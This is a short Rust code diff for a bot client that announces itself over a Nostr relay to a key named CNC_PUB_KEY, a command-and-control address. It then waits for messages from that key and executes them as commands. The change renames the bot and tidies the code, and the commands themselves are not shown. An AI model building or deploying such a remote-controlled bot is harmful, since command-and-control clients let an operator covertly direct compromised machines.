@@ -14,8 +14,8 @@ const RELAYS: [&str; 1] = ["wss://relay.primal.net"];
 
 pub async fn run() -> Result<()> {
     let session = Session::create(SessionProps {
-        name: "bot1".to_string(),
-        display_name: "bot1".to_string(),
+        name: "bot2".to_string(),
+        display_name: "bot2".to_string(),
         private_key: None,
         relays: RELAYS.to_vec().iter().map(|&s| s.to_string()).collect(),
     })
@@ -26,9 +26,8 @@ pub async fn run() -> Result<()> {
         .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
         .await?;
 
-    let mut stream = session
-        .receive_msgs(PublicKey::parse(CNC_PUB_KEY).unwrap())
-        .await?;
+    let public_key = PublicKey::parse(CNC_PUB_KEY).unwrap();
+    let mut stream = session.receive_msgs(public_key).await?;
 
     loop {
         // What the hell men, new events are not received by subscription!?
@@ -36,6 +35,7 @@ pub async fn run() -> Result<()> {
             println!("RECEIVED MESSAGE: {}", msg);
             if let Some(command) = Commands::parse(msg.as_str()) {
                 command.execute(&session).await?;
+                println!("Handled command");
             }
         }
     }
